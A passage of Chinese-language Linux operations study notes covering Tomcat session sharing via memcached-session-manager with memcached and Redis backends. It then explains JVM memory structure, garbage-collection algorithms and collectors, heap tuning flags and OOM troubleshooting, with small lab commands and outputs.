('10.0.0.28:11211 (1)', {'343CF98C301DA5606FCB0C5ABE9C2208-n2': '[89 b; 1657507789 s]'})





#3.测试non-sticky模式
浏览器一刷新，以前sticky模式下只有斜对角机器有session信息，现在non-sticky模式下,两个节点互为主从，都存放了seesion信息
[11:44:55 root@centos7 ~]#./showmemcached.py
------------------------------
('10.0.0.8:11211 (1)', {'bak:44D7231C5A956D6F3D7E7873A7AC4EE1-n2': '[89 b; 1657514716 s]'})    #bak备用
('10.0.0.28:11211 (1)', {'44D7231C5A956D6F3D7E7873A7AC4EE1-n2': '[89 b; 1657514715 s]'})
```

**edge浏览器访问**

![1657507595429](linux体系.assets/1657507595429.png)

**chrom浏览器访问**

![1657507724411](linux体系.assets/1657507724411.png)

##### 44.6.7.5 redis实现non-sticky模式的msm

![1657511811108](linux体系.assets/1657511811108.png)**环境准备**

|    IP     | 主机名  |  服务   |           软件           |
| :-------: | :-----: | :-----: | :----------------------: |
| 10.0.0.8  |  proxy  | 调度器  |       Nginx、HTTPD       |
| 10.0.0.18 | tomcat1 | tomcat1 | JDK8、Tomcat8、memcached |
| 10.0.0.28 | tomcat2 | tomcat2 | JDK8、Tomcat8、memcached |
| 10.0.0.38 |  redis  |  redis  |          redis           |

**10.0.0.38**

```
[root@redis ~]# yum -y install redis
[root@redis ~]# vim /etc/redis.conf
bind 0.0.0.0   #修改第69行
[root@redis ~]# systemctl enable --now redis





#2.基于上面实验
10.0.18和10.0.28都修改context.xml

#支持redis模式
[root@tomcat2 ~]# vim /usr/local/tomcat/conf/context.xml
<Context>
<Manager className="de.javakaffee.web.msm.MemcachedBackupSessionManager"
   memcachedNodes="redis://10.0.0.38"  #修改此行
   sticky="false"
   sessionBackupAsync="false"
   lockingMode="uriPattern:/path1|/path2"
   requestUriIgnorePattern=".*\.(ico|png|gif|jpg|css|js)$"
   transcoderFactoryClass="de.javakaffee.web.msm.serializer.kryo.KryoTranscoderFactory"
   />
</Context>
```

![1657513298887](linux体系.assets/1657513298887.png)

![1657513324091](linux体系.assets/1657513324091.png)

##### 44.6.7.6 Session问题方案总结

```
通过多组实验，使用不同技术实现了session持久机制
     1.session绑定，基于IP或session cookie的。其部署简单，尤其基于session黏性的方式，粒度小，对负载均衡影响小。但一旦后端服务器有故障，其上的session丢失。
     
     2.session复制集群，基于tomcat实现多个服务器内共享同步所有session。此方法可以保证任意一台后端服务器故障，其余各服务器上还都存有全部session，对业务无影响。但是它基于多播实现心跳，TCP单播实现复制，当设备节点过多，这种复制机制不是很好的解决方案。且并发连接多的时候，单机上的所有session占据的内存空间非常巨大，甚至耗尽内存。
     
     3.session服务器，将所有的session存储到一个共享的内存空间中，使用多个冗余节点保存session，这样做到session存储服务器的高可用，且占据业务服务器内存较小。是一种比较好的解决session持久的解决方案。
     
以上的方法都有其适用性。生产环境中，应根据实际需要合理选择。

不过以上这些方法都是在内存中实现了session的保持，可以使用数据库或者文件系统，把session数据存储起来，持久化。这样服务器重启后，也可以重新恢复session数据。不过session数据是有时效性的，是否需要这样做，视情况而定。
```

### 44.7 Tomcat性能优化

```
在目前流行的互联网架构中，Tomcat在目前的网络编程中是举足轻重的，由于Tomcat的运行依赖于JVM，从虚拟机的角度把Tomcat的调整分为外部环境调优JVM和Tomcat自身调优两部分
```

#### 44.7.1 JVM组成

![1657530816767](linux体系.assets/1657530816767.png)

```
#1.JVM 组成部分
类加载子系统: 使用Java语言编写.java Source Code文件，通过javac编译成.class Byte Code文件。class loader类加载器将所需所有类加载到内存，必要时将类实例化成实例。

运行时数据区: 最消耗内存的空间,需要优化。

执行引擎: 包括JIT (JustInTimeCompiler)即时编译器, GC垃圾回收器。

本地方法接口: 将本地方法栈通过JNI(Java Native Interface)调用Native Method Libraries, 比 如:C,C++库等,扩展Java功能,融合不同的编程语言为Java所用。




#2.JVM运行时数据区域由下面部分构成：
Method Area 方法区(线程共享)：所有线程共享的内存空间，存放已加载的类信息(构造方法,接口定义),常量(final),静态变量(static), 运行时常量池等。但实例变量存放在堆内存中. 从JDK8开始此空间由永久代改名为元空间。

heap 堆(线程共享)：虚拟机启动时创建,存放创建的所有对象信息。如果对象无法申请到可用内存将抛出OOM异常.堆是靠GC垃圾回收器管理的,通过-Xmx -Xms 指定最大堆和最小堆空间大小。

Java stack Java栈(线程私有)：每个线程会分配一个栈，存放java中8大基本数据类型,对象引用,实例的本地变量,方法参数和返回值等,基于FILO()（First In Last Out）,每个方法为一个栈帧。

Program Counter Register PC寄存器(线程私有)：就是一个指针,指向方法区中的方法字节码,每一个线程用于记录当前线程正在执行的字节码指令地址。由执行引擎读取下一条指令.因为线程需要切换，当一个线程被切换回来需要执行的时候，知道执行到哪里了。

Native Method stack 本地方法栈(线程私有)：为本地方法执行构建的内存空间，存放本地方法执行时的局部变量、操作数等。
所谓本地方法，使用native关健字修饰的方法,比如:Thread.sleep方法. 简单的说是非Java实现的方法，例如操作系统的C编写的库提供的本地方法，Java调用这些本地方法接口执行。但是要注意，本地方法应该避免直接编程使用，因为Java可能跨平台使用，如果用了Windows API，换到了Linux平台部署就有了问题
```

#### 44.7.2 GC面临的问题

```
对于垃圾回收,需要解决三个问题
哪些是垃圾要回收？
怎么回收垃圾？
什么时候回收垃圾？
```

#### 44.7.3 Garbage垃圾确定方法

```
1.引用计数: 每一个堆内对象上都与一个私有引用计数器，记录着被引用的次数，引用计数清零，该对象所占用堆内存就可以被回收。循环引用的对象都无法将引用计数归零，就无法清除。Python中即使用此种方式

2.根搜索(可达)算法 Root Searching:在GC Roots里定义着线程栈变量，静态变量，常量池，java本地接口，如果把这四个作为根，从根一直往下搜索，如果有哪些对象没有被这四个引用，就认为是垃圾对象，所以要进行垃圾回收。
```

![1657534175857](linux体系.assets/1657534175857.png)

#### 44.7.4 垃圾回收基本算法

##### 44.7.4.1 标记-清除 Mark-Sweep

![1657535041107](linux体系.assets/1657535041107.png)

```
#1.概述
分垃圾标记阶段和内存释放阶段。标记阶段，找到所有可访问对象打个标记。清理阶段，遍历整个堆，对未标记对象(即不再使用的对象)清理。


#2.优缺点
标记-清除最大的问题会造成内存碎片,但是效率很高,不浪费空间
```

##### 44.7.4.2 标记-压缩 Mark-Compact

![1657535424340](linux体系.assets/1657535424340.png)

```
#1.概述
分垃圾标记阶段和内存整理阶段。标记阶段，找到所有可访问对象打个标记。内存清理阶段时，整理时将对象向内存一端移动，整理后存活对象连续的集中在内存一端



#2.优缺点
标记-压缩算法好处是整理后内存空间连续分配，有大段的连续内存可分配，没有内存碎片。
缺点是内存整理过程有消耗,效率相对低下
```

##### 44.7.4.3 复制 Copying

```
#1.概述
先将可用内存分为大小相同两块区域A和B，每次只用其中一块，比如A。当A用完后，则将A中存活的对象复制到B。复制到B的时候连续的使用内存，最后将A一次性清除干净。



#2.优缺点
缺点是比较浪费内存，只能使用原来一半内存，因为内存对半划分了，复制过程毕竟也是有代价。
好处是没有碎片，复制过程中保证对象使用连续空间
```

##### 44.7.4.4 多种算法总结

```
没有最好的算法,在不同场景选择最合适的算法



效率: 标记清除算法>复制算法> 标记压缩算法
内存整齐度: 复制算法=标记压缩算法> 标记清除算法
内存利用率: 标记压缩算法=标记清除算法>复制算法
```

#### 44.7.5 分代堆内存GC策略

##### 44.7.5.1 堆内存分代

**将heap内存空间分为三个不同类别: 年轻代、老年代、持久代**

![1657536873963](linux体系.assets/1657536873963.png)

![1657545884808](linux体系.assets/1657545884808.png)

```
Heap堆内存分为
  年轻代Young：Young Generation
     伊甸园区eden: 只有一个,刚刚创建的对象
     幸存(存活)区Servivor Space：有2个幸存区，一个是from区，一个是to区。大小相等、地位相同、可互换。
        from 指的是本次复制数据的源区
        to 指的是本次复制数据的目标区
        

老年代Tenured：Old Generation, 长时间存活的对象


真正的堆只有年轻代和老年代，没有元空间！！！！
#年轻代+老年代占用了所有heap空间, Metaspace实际不占heap空间,逻辑上存在于Heap.
#默认JVM试图分配最大内存的总内存的1/4,初始化默认总内存为总内存的1/64
```

**默认空间大小比例:**

![1657546251985](linux体系.assets/1657546251985.png)

```
永久代：JDK1.7之前使用, 即Method Area方法区,保存JVM自身的类和方法,存储JAVA运行时的环境信息, JDK1.8后 改名为 MetaSpace,此空间不存在垃圾回收,关闭JVM会释放此区域内存,此空间物理上不属于heap内存,但逻辑上存在于heap内存

    永久代必须指定大小限制,字符串常量JDK1.7存放在永久代,1.8后存放在heap中
    MetaSpace 可以设置,也可不设置,无上限规律
    
    
一般情况99%的对象都是临时对象
```

##### 44.7.5.2 年轻代回收Minor GC

```
1. 起始时，所有新建对象(特大对象直接进入老年代)都出生在eden，当eden满了，启动GC。这个称为Young GC 或者 Minor GC。
2. 先标记eden存活对象，然后将存活对象复制到s0（假设本次是s0，也可以是s1，它们可以调换），eden剩余所有空间都清空。GC完成。
3. 继续新建对象，当eden满了，启动GC。
4. 先标记eden和s0中存活对象，然后将存活对象复制到s1。将eden和s0清空,此次GC完成。
5. 继续新建对象，当eden满了，启动GC。
6. 先标记eden和s1中存活对象，然后将存活对象复制到s0。将eden和s1清空,此次GC完成。


以后就重复上面的步骤。
通常场景下,大多数对象都不会存活很久，而且创建活动非常多，新生代就需要频繁垃圾回收。
但是，如果一个对象一直存活，它最后就在from、to来回复制，如果from区中对象复制次数达到阈值(默认15次,CMS为6次,可通过java的选项 -XX:MaxTenuringThreshold=N 指定)，就直接复制到老年代。
```

##### 44.7.5.3 老年代回收Major GC

```
进入老年代的数据较少，所以老年代区被占满的速度较慢，所以垃圾回收也不频繁。

如果老年代也满了,会触发老年代GC,称为Old GC或者 Major GC。

由于老年代对象一般来说存活次数较长，所以较常采用标记-压缩算法。

当老年代满时,会触发 Full GC,即对所有"代"的内存进行垃圾回收

Minor GC比较频繁，Major GC较少。但一般Major GC时，由于老年代对象也可以引用新生代对象，所以先进行一次Minor GC，然后在Major GC会提高效率。可以认为回收老年代的时候完成了一次Full GC。
所以可以认为 MajorGC = FullGC
```

##### 44.7.5.4 GC触发条件

![1657548226977](linux体系.assets/1657548226977.png)

```
Minor GC 触发条件：当eden区满了触发

Full GC 触发条件：
  老年代满了
  System.gc()手动调用。不推荐
  
年轻代:
  存活时长低
  适合复制算法
  
老年代:
  区域大,存活时长高
  适合标记清除和标记压缩算法
```

#### 44.7.6 java内存调整相关参数

##### 44.7.6.1 JVM内存常用相关参数

**Java命令行参考文档: https://docs.oracle.com/javase/8/docs/technotes/tools/unix/java.html**

![1657548853472](linux体系.assets/1657548853472.png)

```
选项分类
 -选项名称 此为标准选项,所有HotSpot都支持
 -X选项名称 此为稳定的非标准选项
 -XX:选项名称 非标准的不稳定选项，下一个版本可能会取消
```

|       参数        |                             说明                             |                          举例                          |
| :---------------: | :----------------------------------------------------------: | :----------------------------------------------------: |
|       -Xms        |      设置应用程序初始使用的堆内存大小（年轻代 +老年代）      |                         -Xms2g                         |
|       -Xmx        | 设置应用程序能获得的最大堆内存 早期JVM不建议超过32G，内存管理效率下降 |                         -Xms4g                         |
|    -XX:NewSize    |                      设置初始新生代大小                      |                    -XX:NewSize=128m                    |
|  -XX:MaxNewSize   |                    设置最大新生代内存空间                    |                  -XX:MaxNewSize=256m                   |
|     -Xmnsize      |       同时设置-XX:NewSize 和 -XX:MaxNewSize， 代替两者       |                         -Xmn1g                         |
|   -XX:NewRatio    |                 以比例方式设置新生代和老年代                 |               -XX:NewRatio=2 new/old=1/2               |
| -XX:SurvivorRatio |             以比例方式设置eden和survivor(S0或S1)             | -XX:SurvivorRatio=6 eden/survivor=6/1 new/survivor=8/1 |
|       -Xss        |     设置每个线程私有的栈空间大小,依据具体线程 大小和数量     |                        -Xss256k                        |

```
#1.查看JVM内存代码
[root@tomcat1 ~]# cat Heap.java 
public class Heap {
    public static void main(String[] args){
        //返回虚拟机试图使用的最大内存,字节单位
        long max = Runtime.getRuntime().maxMemory();
        //返回JVM初始化总内存
        long total = Runtime.getRuntime().totalMemory();

        System.out.println("max="+max+"字节\t"+(max/(double)1024/1024)+"MB");
        System.out.println("total="+total+"字节\t"+(total/(double)1024/1024)+"MB");
    }
}
[root@tomcat1 ~]# javac Heap.java
[root@tomcat1 ~]# java -cp . Heap 
max=421527552字节	402.0MB
total=30408704字节	29.0MB





#2.查看当前内存默认值
[root@tomcat1 ~]# java -XX:+PrintGCDetails -cp . Heap
max=421527552字节	402.0MB   #最大分配
total=30408704字节	29.0MB   #初始分配
Heap
 PSYoungGen      total 9216K, used 671K [0x00000000f6980000, 0x00000000f7380000, 0x0000000100000000)
  eden space 8192K, 8% used [0x00000000f6980000,0x00000000f6a27f68,0x00000000f7180000)
  from space 1024K, 0% used [0x00000000f7280000,0x00000000f7280000,0x00000000f7380000)
  to   space 1024K, 0% used [0x00000000f7180000,0x00000000f7180000,0x00000000f7280000)
 ParOldGen       total 20480K, used 0K [0x00000000e3c00000, 0x00000000e5000000, 0x00000000f6980000)
  object space 20480K, 0% used [0x00000000e3c00000,0x00000000e3c00000,0x00000000e5000000)
 Metaspace       used 2528K, capacity 4486K, committed 4864K, reserved 1056768K
  class space    used 269K, capacity 386K, committed 512K, reserved 1048576K






#3.指定内存空间
[root@tomcat1 ~]# java -Xms1024m -Xmx1024m -XX:+PrintGCDetails -cp . Heap
max=1029177344字节	981.5MB
total=1029177344字节	981.5MB
Heap
 PSYoungGen      total 305664K, used 15729K [0x00000000eab00000, 0x0000000100000000, 0x0000000100000000)
  eden space 262144K, 6% used [0x00000000eab00000,0x00000000eba5c420,0x00000000fab00000)
  from space 43520K, 0% used [0x00000000fd580000,0x00000000fd580000,0x0000000100000000)
  to   space 43520K, 0% used [0x00000000fab00000,0x00000000fab00000,0x00000000fd580000)
 ParOldGen       total 699392K, used 0K [0x00000000c0000000, 0x00000000eab00000, 0x00000000eab00000)
  object space 699392K, 0% used [0x00000000c0000000,0x00000000c0000000,0x00000000eab00000)
 Metaspace       used 2534K, capacity 4486K, committed 4864K, reserved 1056768K
  class space    used 269K, capacity 386K, committed 512K, reserved 1048576K






#4.查看OOM
[root@tomcat1 ~]# cat HeapOom2.java 
import java. util. Random;
public class HeapOom2 {
	public static void main(String[] args) {
		String str = "I am lao liu";
		while (true){
			str += str + new Random().nextInt(88888888);
		}
	}
}

[root@tomcat1 ~]# javac HeapOom2.java 
#内存溢出
[root@tomcat1 ~]# java -cp . HeapOom2
Exception in thread "main" java.lang.OutOfMemoryError: Java heap space
	at java.util.Arrays.copyOf(Arrays.java:3332)
	at java.lang.AbstractStringBuilder.ensureCapacityInternal(AbstractStringBuilder.java:124)
	at java.lang.AbstractStringBuilder.append(AbstractStringBuilder.java:674)
	at java.lang.StringBuilder.append(StringBuilder.java:208)
	at HeapOom2.main(HeapOom2.java:6)


#加入环境变量
[root@tomcat1 ~]# vim /etc/profile.d/jdk.sh 
export JAVA_HOME=/usr/local/jdk
export JRE_HOME=$JAVA_HOME/jre
export CLASSPATH=$JAVA_HOME/lib/:$JRE_HOME/lib/:. #添加此行
export PATH=$PATH:$JAVA_HOME/bin
[root@tomcat1 ~]# source /etc/profile.d/jdk.sh



#打印内存溢出的过程
[root@tomcat1 ~]# java -Xms100m -Xmx100m -XX:+PrintGCDetails HeapOom2
[GC (Allocation Failure) [PSYoungGen: 23943K->2879K(29696K)] 23943K->2879K(98304K), 0.0025372 secs] [Times: user=0.00 sys=0.01, real=0.00 secs] 
[GC (Allocation Failure) [PSYoungGen: 26420K->288K(29696K)] 26420K->5415K(98304K), 0.0032666 secs] [Times: user=0.01 sys=0.00, real=0.00 secs] 
[GC (Allocation Failure) [PSYoungGen: 16152K->288K(29696K)] 41760K->25903K(98304K), 0.0006426 secs] [Times: user=0.00 sys=0.00, real=0.01 secs] 
[GC (Allocation Failure) [PSYoungGen: 21275K->272K(29696K)] 67370K->56607K(98304K), 0.0070203 secs] [Times: user=0.01 sys=0.01, real=0.00 secs] 
[Full GC (Ergonomics) [PSYoungGen: 272K->0K(29696K)] [ParOldGen: 56335K->30977K(68608K)] 56607K->30977K(98304K), [Metaspace: 2487K->2487K(1056768K)], 0.0089191 secs] [Times: user=0.01 sys=0.00, real=0.01 secs] 
[GC (Allocation Failure) [PSYoungGen: 0K->0K(29696K)] 30977K->30977K(98304K), 0.0047667 secs] [Times: user=0.00 sys=0.00, real=0.01 secs] 
[Full GC (Allocation Failure) [PSYoungGen: 0K->0K(29696K)] [ParOldGen: 30977K->30964K(68608K)] 30977K->30964K(98304K), [Metaspace: 2487K->2487K(1056768K)], 0.0033102 secs] [Times: user=0.00 sys=0.00, real=0.00 secs] 
Exception in thread "main" java.lang.OutOfMemoryError: Java heap space
	at java.util.Arrays.copyOf(Arrays.java:3332)
	at java.lang.AbstractStringBuilder.ensureCapacityInternal(AbstractStringBuilder.java:124)
	at java.lang.AbstractStringBuilder.append(AbstractStringBuilder.java:674)
	at java.lang.StringBuilder.append(StringBuilder.java:208)
	at HeapOom2.main(HeapOom2.java:6)
Heap
 PSYoungGen      total 29696K, used 1021K [0x00000000fdf00000, 0x0000000100000000, 0x0000000100000000)
  eden space 25600K, 3% used [0x00000000fdf00000,0x00000000fdfff578,0x00000000ff800000)
  from space 4096K, 0% used [0x00000000ff800000,0x00000000ff800000,0x00000000ffc00000)
  to   space 3072K, 0% used [0x00000000ffd00000,0x00000000ffd00000,0x0000000100000000)
 ParOldGen       total 68608K, used 30964K [0x00000000f9c00000, 0x00000000fdf00000, 0x00000000fdf00000)
  object space 68608K, 45% used [0x00000000f9c00000,0x00000000fba3d098,0x00000000fdf00000)
 Metaspace       used 2519K, capacity 4486K, committed 4864K, reserved 1056768K
  class space    used 268K, capacity 386K, committed 512K, reserved 1048576K
```

##### 44.7.6.2  jvisualvm工具

**JDK 工具监控使用情况**

```
#1.测试用java程序
[root@tomcat1 ~]# cat HelloWorld.java 
public class HelloWorld extends Thread {
    public static void main(String[] args) {
        try {
            while (true) {
				Thread.sleep(2000);
				System.out.println("hello liu");
			}            
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
    }
}
[root@tomcat1 ~]# javac HelloWorld.java
[root@tomcat1 ~]# java HelloWorld
hello liu
hello liu



#2.观察哪个进程运行
[root@tomcat1 ~]# jps
52340 HelloWorld
52390 Jps
[root@tomcat ~]#java -Xms128m -Xmx512m -XX:NewSize=64m -XX:MaxNewSize=200m HelloWorld



#3.运行图形工具
[root@tomcat1 ~]# jvisualvm
#安装 Visual GC插件显示更详细的信息
```

![1657552129749](linux体系.assets/1657552129749.png)

![1657552208061](linux体系.assets/1657552208061.png)

![1657552219190](linux体系.assets/1657552219190.png)

![1657552560813](linux体系.assets/1657552560813.png)

##### 44.7.6.3 Jprofiler定位OOM

```
#1.概述
JProfiler官网：http://www.ej-technologies.com/products/jprofiler/overview.html
JProfiler是一款功能强大的Java开发分析工具，它可以快速的帮助用户分析出存在的错误，软件还可对需要的显示类进行标记，包括了内存的分配情况和信息的视图等





#2.范例: 安装jprofiler工具定位OOM原因和源码问题的位置
[root@centos8 ~]#cat HeapOom.java 
import java.util.ArrayList;
import java.util.List;
public class HeapOom {
   public static void main(String[] args) {
       List<byte[]> list =new ArrayList<byte[]>();
       int i = 0;
       boolean flag = true;
        while(flag){
           try{
               i++;
               list.add(new byte[1024* 1024]);//每次增加一个1M大小的数组对象
               Thread.sleep(1000);
           }catch(Throwable e){
               e.printStackTrace();
               flag = false;
               System.out.println("count="+i);//记录运行的次数
           }
       }
   }
}


[root@centos8 ~]#javac HeapOom.java 
[root@centos8 ~]#java -cp . -Xms5m -Xmx10m -XX:+HeapDumpOnOutOfMemoryError HeapOom
java.lang.OutOfMemoryError: Java heap space
Dumping heap to java_pid54191.hprof ...
Heap dump file created [7088252 bytes in 0.192 secs]
java.lang.OutOfMemoryError: Java heap space
	at HeapOom.main(HeapOom.java:12)
count=7

[root@tomcat1 ~]# sz java_pid54191.hprof
```

![1657589885359](linux体系.assets/1657589885359.png)

![1657590127967](linux体系.assets/1657590127967.png)

##### 44.7.6.4 Tomcat的JVM参数设置

```
默认不指定，-Xmx大约使用了1/4的内存，当前本机内存指定约为1G。 在bin/catalina.sh中增加一行



#设置参数
[root@tomcat1 ~]# vim /usr/local/tomcat/bin/catalina.sh
# OS specific support.  $var _must_ be set to either true or false.
....
JAVA_OPTS="-server -Xms512m -Xmx512m -XX:NewSize=100m -XX:MaxNewSize=200m"
....
[root@tomcat1 ~]# systemctl restart tomcat.service



#查看进程
[root@tomcat1 ~]# ps aux |grep java
tomcat     54623 31.5 23.3 3061356 429824 ?      Sl   09:54   0:34 /usr/local/jdk/bin/java -Djava.util.logging.config.file=/usr/local/tomcat/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -server -Xms512m -Xmx512m -XX:NewSize=100m -XX:MaxNewSize=200m -Djdk.tls.ephemeralDHKeySize=2048 -Djava.protocol.handler.pkgs=org.apache.catalina.webresources -Dorg.apache.catalina.security.SecurityListener.UMASK=0027 -Dignore.endorsed.dirs= -classpath /usr/local/tomcat/bin/bootstrap.jar:/usr/local/tomcat/bin/tomcat-juli.jar -Dcatalina.base=/usr/local/tomcat -Dcatalina.home=/usr/local/tomcat -Djava.io.tmpdir=/usr/local/tomcat/temp org.apache.catalina.startup.Bootstrap start
root       54725  0.0  0.0  12108  1044 pts/1    R+   09:56   0:00 grep --color=auto java
```

![1657591136130](linux体系.assets/1657591136130.png)

#### 44.7.7 垃圾收集方式

```
按工作模式不同：指的是GC线程和工作线程是否一起运行
   独占垃圾回收器：只有GC在工作，STW 一直进行到回收完毕，工作线程才能继续执行
   并发垃圾回收器：让GC线程垃圾回收某些阶段可以和工作线程一起进行,如:标记阶段并行,回收阶段仍然串行
   
按回收线程数：指的是GC线程是否串行或并行执行
   串行垃圾回收器：一个GC线程完成回收工作
   并行垃圾回收器：多个GC线程同时一起完成回收工作，充分利用CPU资源
   
   
STW：
对于大多数垃圾回收算法而言，GC线程工作时，停止所有工作的线程，称为Stop The World。GC完成时，恢复其他工作线程运行。这也是JVM运行中最头疼的问题
```

![1657591752411](linux体系.assets/1657591752411.png)

#### 44.7.8 调整策略

```
对JVM调整策略应用极广
  在WEB领域中Tomcat等
  在大数据领域Hadoop生态各组件
  在消息中间件领域的Kafka等
  在搜索引擎领域的ElasticSearch、Solr等
  
注意: 在不同领域和场景对JVM需要不同的调整策略
  减少 STW 时长，串行变并行
  减少 GC 次数，要分配合适的内存大小
  
一般情况下，我们大概可以使用以下原则：
  客户端或较小程序，内存使用量不大，可以使用串行回收
  对于服务端大型计算，可以使用并行回收
  大型WEB应用，用户端不愿意等待，尽量少的STW，可以使用并发回收
```

#### 44.7.9 垃圾回收器

![1657591957169](linux体系.assets/1657591957169.png)

##### 44.7.9.1 按分代设置不同垃圾回收器

**新生代**

```
新生代串行收集器Serial：单线程、独占式串行，采用复制算法,简单高效但会造成STW
```

![1657592123534](linux体系.assets/1657592123534.png)

```
新生代并行回收收集器PS(Parallel Scavenge)：多线程并行、独占式，会产生STW, 使用复制算法

关注调整吞吐量,此收集器关注点是达到一个可控制的吞吐量
吞吐量 = 运行用户代码时间/（运行用户代码时间+垃圾收集时间），比如虚拟机总共运行100分钟，其中垃圾回收花掉1分钟，那吞吐量就是99%。

高吞吐量可以高效率利用CPU时间，尽快完成运算任务，主要适合在后台运算而不需要太多交互的任务。

除此之外，Parallel Scavenge 收集器具有自适应调节策略，它可以将内存管理的调优任务交给虚拟机去完成。自适应调节策略也是Parallel Scavenge与 ParNew 收集器的一个重要区别。
和ParNew不同,PS不可以和老年代的CMS组合

新生代并行收集器ParNew：就是Serial 收集器的多线程版,将单线程的串行收集器变成了多线程并行、独占式,使用复制算法,相当于PS的改进版

经常和CMS配合使用,关注点是尽可能地缩短垃圾收集时用户线程的停顿时间，适合需要与用户交互的程序，良好的响应速度能提升用户体验
```

![1657592403772](linux体系.assets/1657592403772.png)

**老年代：**

```
老年代串行收集器Serial Old：Serial Old是Serial收集器的老年代版本,单线程、独占式串行，回收算法使用标记压缩

老年代并行回收收集器Parallel Old：多线程、独占式并行，回收算法使用标记压缩，关注调整吞吐量

Parallel Old收集器是Parallel Scavenge 收集器的老年代版本，这个收集器是JDK1.6之后才开始提供，从HotSpot虚拟机的垃圾收集器的图中也可以看出，Parallel Scavenge 收集器无法与CMS收
集器配合工作,因为一个是为了吞吐量，一个是为了客户体验（也就是暂停时间的缩短）

CMS (Concurrent Mark Sweep并发标记清除算法) 收集器在某些阶段尽量使用和工作线程一起运行，减少STW时长(200ms以内), 提升响应速度,是互联网服务端BS系统上较佳的回收算法

分为4个阶段：初始标记、并发标记、重新标记、并发清除，在初始标记、重新标记时需要
STW。
```

![1657592866690](linux体系.assets/1657592866690.png)

```
初始标记：此过程需要STW（Stop The Word），只标记一下GC Roots能直接关联到的对象，速度很快。

并发标记：就是GC Roots进行扫描可达链的过程，为了找出哪些对象需要收集。这个过程远远慢于初始标记，但它是和用户线程一起运行的，不会出现STW，所有用户并不会感受到。

重新标记：为了修正在并发标记期间，用户线程产生的垃圾，这个过程会比初始标记时间稍微长一点，但是也很快，和初始标记一样会产生STW。

并发清理：在重新标记之后，对现有的垃圾进行清理，和并发标记一样也是和用户线程一起运行的，耗时较长（和初始标记比的话），不会出现STW。

由于整个过程中，耗时最长的并发标记和并发清理都是与用户线程一起执行的，所以总体上来说，CMS收集器的内存回收过程是与用户线程一起并发执行的。
```

##### 44.7.9.2 不按分代设置不同垃圾回收器

```
G1(Garbage First)收集器
   是最新垃圾回收器，从JDK1.6实验性提供，JDK1.7发布，其设计目标是在多处理器、大内存服务器端提供优于CMS收集器的吞吐量和停顿控制的回收器。JDK9将G1设为默认的收集器,建议 JDK9版本以后使用。
   
   基于标记压缩算法,不会产生大量的空间碎片，有利于程序的长期执行。
   分为4个阶段：初始标记、并发标记、最终标记、筛选回收。并发标记并发执行，其它阶段STW只有GC线程并行执行。
   G1收集器是面向服务端的收集器，它的思想就是首先回收尽可能多的垃圾（这也是Garbage-First名字的由来）
   G1能充分的利用多CPU，多核环境下的硬件优势，使用多个CPU来缩短STW停顿的时间(10ms以内)。
   可预测的停顿：这是G1相对于CMS的另一大优势，G1和CMS一样都是关注于降低停顿时间，但是G1能够让使用者明确的指定在一个M毫秒的时间片段内，消耗在垃圾收集的时间不得超过N毫秒。
通过此选项指定: +UseG1GC

ZGC收集器: 减少SWT时长(1ms以内), 可以PK C++的效率,目前实验阶段
Shenandoah收集器: 和ZGC竞争关系,目前实验阶段
Epsilon收集器: 调试 JDK 使用,内部使用,不用于生产环境

JVM 1.8 默认的垃圾回收器：PS + ParallelOld,所以大多数都是针对此进行调优
```

##### 44.7.9.3 垃圾收集器设置

```
#1.相关设置
优化调整Java 相关参数的目标: 尽量减少FullGC和STW
通过以下选项可以单独指定新生代、老年代的垃圾收集器
-server 指定为Server模式,也是默认值,一般使用此工作模式
-XX:+UseSerialGC
  运行在Client模式下，新生代是Serial, 老年代使用SerialOld

-XX:+UseParNewGC
  新生代使用ParNew，老年代使用SerialOld

-XX:+UseParallelGC 
   运行于server模式下，新生代使用Serial Scavenge, 老年代使用SerialOld

-XX:+UseParallelOldGC 
   新生代使用Paralell Scavenge, 老年代使用Paralell Old
   -XX:ParallelGCThreads=N，在关注吞吐量的场景使用此选项增加并行线程数

-XX:+UseConcMarkSweepGC
新生代使用ParNew, 老年代优先使用CMS，备选方式为Serial Old
响应时间要短，停顿短使用这个垃圾收集器
-XX:CMSInitiatingOccupancyFraction=N，N为0-100整数表示达到老年代的大小的百分比多少触发回收
    默认68
-XX:+UseCMSCompactAtFullCollection 开启此值,在CMS收集后，进行内存碎片整理
-XX:CMSFullGCsBeforeCompaction=N 设定多少次CMS后，进行一次内存碎片整理
-XX:+CMSParallelRemarkEnabled 降低标记停顿






#2.案例
[root@tomcat1 ~]# vim /usr/local/tomcat/bin/catalina.sh
........
# OS specific support.  $var _must_ be set to either true or false.
JAVA_OPTS="-server -Xmx512m -Xms128m -XX:NewSize=48m -XX:MaxNewSize=200m -XX:+UseConcMarkSweepGC -XX:+UseCMSCompactAtFullCollection -XX:CMSFullGCsBeforeCompaction=5"
........
[root@tomcat1 ~]# systemctl restart tomcat.service 
[root@tomcat1 ~]# ps aux |grep java
tomcat     55218 49.0 15.7 3066280 290636 ?      Sl   10:48   0:31 /usr/local/jdk/bin/java -Djava.util.logging.config.file=/usr/local/tomcat/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -server -Xmx512m -Xms128m -XX:NewSize=48m -XX:MaxNewSize=200m -XX:+UseConcMarkSweepGC -XX:+UseCMSCompactAtFullCollection -XX:CMSFullGCsBeforeCompaction=5 -Djdk.tls.ephemeralDHKeySize=2048 -Djava.protocol.handler.pkgs=org.apache.catalina.webresources -Dorg.apache.catalina.security.SecurityListener.UMASK=0027 -Dignore.endorsed.dirs= -classpath /usr/local/tomcat/bin/bootstrap.jar:/usr/local/tomcat/bin/tomcat-juli.jar -Dcatalina.base=/usr/local/tomcat -Dcatalina.home=/usr/local/tomcat -Djava.io.tmpdir=/usr/local/tomcat/temp org.apache.catalina.startup.Bootstrap start
root       55297  0.0  0.0  12108   988 pts/1    R+   10:49   0:00 grep --color=auto java
```

![1657597499495](linux体系.assets/1657597499495.png)

#### 44.7.10 JAVA参数总结

|  **参数名称**   |          **含义**           |      **默认值**      |                                                              |
| :-------------: | :-------------------------: | :------------------: | :----------------------------------------------------------: |
|      -Xms       |         初始堆大小          | 物理内存的1/64(<1GB) | 默认(MinHeapFreeRatio参数可以调整)空余堆内存小于40%时，JVM就会增大堆直到-Xmx的最大限制. |
|      -Xmx       |         最大堆大小          | 物理内存的1/4(<1GB)  | 默认(MaxHeapFreeRatio参数可以调整)空余堆内存大于70%时，JVM会减少堆直到-Xms的最小限制 |
